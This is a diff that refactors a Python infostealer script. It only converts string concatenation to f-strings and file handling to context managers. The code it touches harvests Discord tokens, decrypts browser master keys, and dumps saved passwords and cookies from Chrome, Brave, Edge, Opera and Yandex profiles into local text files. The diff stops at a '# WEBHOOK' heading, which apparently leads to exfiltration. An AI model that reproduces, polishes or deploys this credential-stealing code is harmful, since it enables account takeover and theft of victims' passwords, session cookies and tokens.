@@ -13,22 +13,22 @@ local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 
 tokenPaths = {
-    'Discord': roaming + '\\Discord',
-    'Discord Canary': roaming + '\\discordcanary',
-    'Discord PTB': roaming + '\\discordptb',
-    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-    'Opera': roaming + '\\Opera Software\\Opera Stable',
-    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-    'OperaGX': roaming + '\\Opera Software\\Opera GX Stable'
+    'Discord': f"{roaming}\\Discord",
+    'Discord Canary': f"{roaming}\\discordcanary",
+    'Discord PTB': f"{roaming}\\discordptb",
+    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
+    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
+    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
+    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
 }
 
 browser_loc = {
-    "Chrome": local + "\\Google\\Chrome",
-    "Brave": local + "\\BraveSoftware\\Brave-Browser",
-    "Edge": local + "\\Microsoft\\Edge",
-    "Opera": roaming + "\\Opera Software\\Opera Stable",
-    "OperaGX": roaming + "\\Opera Software\\Opera GX Stable",
+    "Chrome": f"{local}\\Google\\Chrome",
+    "Brave": f"{local}\\BraveSoftware\\Brave-Browser",
+    "Edge": f"{local}\\Microsoft\\Edge",
+    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
+    "OperaGX": f"{roaming}\\Opera Software\\Opera GX Stable",
 }
 
 fileCookies = "cooks_" + os.getlogin() + ".txt"
@@ -38,9 +38,7 @@ fileInfo = "info_" + os.getlogin() + ".txt"
 # CHROME PROFILES
 for i in os.listdir(browser_loc['Chrome'] + "\\User Data"):
     if i.startswith("Profile "):
-        browser_loc["ChromeP"] = local + "\\Google\\Chrome\\User Data\\" + i
-        
-        
+        browser_loc["ChromeP"] = f"{local}\\Google\\Chrome\\User Data\\{i}"
 # DISCORD TOKENS
 def decrypt_token(buff, master_key):
     try:
@@ -54,13 +52,12 @@ def get_tokens(path):
     cleaned = []
     tokens = []
     done = []
-    lev_db = path + "\\Local Storage\\leveldb\\"
-    loc_state = path + "\\Local State"
+    lev_db = f"{path}\\Local Storage\\leveldb\\"
+    loc_state = f"{path}\\Local State"
     # new method with encryption
     if os.path.exists(loc_state):
         with open(loc_state, "r") as file:
             key = loads(file.read())['os_crypt']['encrypted_key']
-            file.close()
         for file in os.listdir(lev_db):
             if not file.endswith(".ldb") and file.endswith(".log"):
                 continue
@@ -117,12 +114,11 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
 
         if os.path.exists(LoginData):
             copy2(LoginData, "TempMan.db")
-            con = connect("TempMan.db")
-            cur = con.cursor()
+            with connect("TempMan.db") as conn:
+                cur = conn.cursor()
             cur.execute("SELECT origin_url, username_value, password_value FROM logins")
             with open(filePass, "a") as f:
-                f.write("***" + name + "***\n")
-                f.close()
+                f.write(f"*** {name} ***\n")
             for index, logins in enumerate(cur.fetchall()):
                 try:
                     if not logins[0]:
@@ -140,13 +136,11 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                     to_print = f"URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n"
                     with open(filePass, "a") as f:
                         f.write(to_print)
-                        f.close()
                 except (Exception, FileNotFoundError):
                     pass
         else:
-            f = open(fileInfo, "a")
-            f.write(name + " Login Data file missing\n")
-            f.close()
+            with open(fileInfo, "a") as f:
+                f.write(f"{name} Login Data file missing\n")
         ######################################################################
         if os.path.exists(CookiesFile):
             copy2(CookiesFile, "CookMe.db")
@@ -154,8 +148,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                 curr = conn.cursor()
             curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
             with open(fileCookies, "a") as f:
-                f.write("***" + name + "***\n")
-                f.close()
+                f.write(f"*** {name} ***\n")
             for index, cookies in enumerate(curr.fetchall()):
                 try:
                     if not cookies[0]:
@@ -171,20 +164,17 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
                     enc_pass = ciphers[15:-16]
                     cipher = generate_cipher(master_key, init_vector)
                     dec_pass = decrypt_payload(cipher, enc_pass).decode()
-                    to_print = 'URL : {}\nName: {}\nCook: {}\n\n'.format(cookies[0], cookies[1], dec_pass)
+                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                     with open(fileCookies, "a") as f:
                         f.write(to_print)
-                        f.close()
                 except (Exception, FileNotFoundError):
                     pass
         else:
             with open(fileInfo, "a") as f:
-                f.write("no " + name + " Cookie file\n")
-                f.close()
+                f.write(f"no {name} Cookie file\n")
     else:
         with open(fileInfo, "a") as f:
-            f.write(name + " Local State file missing\n")
-            f.close()
+            f.write(f"{name} Local State file missing\n")
 
 
 
@@ -195,14 +185,14 @@ def Local_State(path):
 
 def Login_Data(path):
     if "Profile" in path:
-        return path + "\\Login Data"
+        return f"{path}\\Login Data"
     else:
         return f"{path}\\User Data\\Default\\Login Data"
 
 
 def Cookies(path):
     if "Profile" in path:
-        return path + "\\Network\\Cookies"
+        return f"{path}\\Network\\Cookies"
     else:
         return f"{path}\\User Data\\Default\\Network\\Cookies"
 
@@ -220,7 +210,6 @@ def main_tokens():
         with open(fileInfo, "a") as f:
             for i in tokens:
                 f.write(str(i) + "\n")
-            f.close()
 
 
 def decrypt_files(path, browser):
@@ -229,7 +218,6 @@ def decrypt_files(path, browser):
     else:
         with open(fileInfo, "a") as f:
             f.write(browser + " not installed\n")
-            f.close()
 
 
 # WEBHOOK
